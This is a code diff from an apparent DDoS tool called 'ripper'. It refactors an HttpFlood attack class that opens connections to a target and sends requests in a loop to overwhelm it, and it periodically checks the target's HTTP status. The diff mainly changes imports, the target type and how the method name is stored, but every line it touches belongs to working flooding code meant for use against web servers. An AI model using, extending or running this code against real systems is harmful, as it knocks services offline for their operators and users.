@@ -2,29 +2,32 @@ import random
 import re
 from contextlib import suppress
 from socket import socket
-from typing import Any, Tuple
-
+from typing import Any
 from socks import ProxyError
 
 from ripper.constants import HTTP_STATUS_CODE_CHECK_PERIOD_SEC
-from ripper.context import Context, Errors
+from ripper.context.errors import Errors
+from ripper.context.target import Target
 from ripper.actions.attack_method import AttackMethod
 
 HTTP_STATUS_PATTERN = re.compile(r" (\d{3}) ")
+# Forward Reference
+Context = 'Context'
 
 
 class HttpFlood(AttackMethod):
+    """HTTP Flood method."""
+
+    name: str = 'HTTP Flood'
+    label: str = 'http-flood'
+
     _http_method: str
-    _target: Tuple[str, int]
+    _target: Target
     _ctx: Context
     _proxy: Any = None
     _http_connect: socket = None
 
-    @property
-    def name(self):
-        return 'HTTP Flood'
-
-    def __init__(self, target: Tuple[str, int], context: Context):
+    def __init__(self, target: Target, context: Context):
         self._target = target
         self._ctx = context
         self._http_method = context.http_method
@@ -37,7 +40,7 @@ class HttpFlood(AttackMethod):
 
     def __call__(self, *args, **kwargs):
         with suppress(Exception), self.create_connection() as self._http_connect:
-            self._http_connect.connect(self._target)
+            self._http_connect.connect(self._target.hostip_port_tuple())
             self._ctx.Statistic.connect.status_success()
             while self.send(self._http_connect):
                 continue
@@ -46,7 +49,7 @@ class HttpFlood(AttackMethod):
         with suppress(Exception):
             if self._ctx.check_timer(HTTP_STATUS_CODE_CHECK_PERIOD_SEC):
                 check_sock = self.create_connection()
-                check_sock.connect(self._target)
+                check_sock.connect(self._target.hostip_port_tuple())
                 check_sock.send(payload)
                 http_response = repr(check_sock.recv(32))
                 check_sock.close()
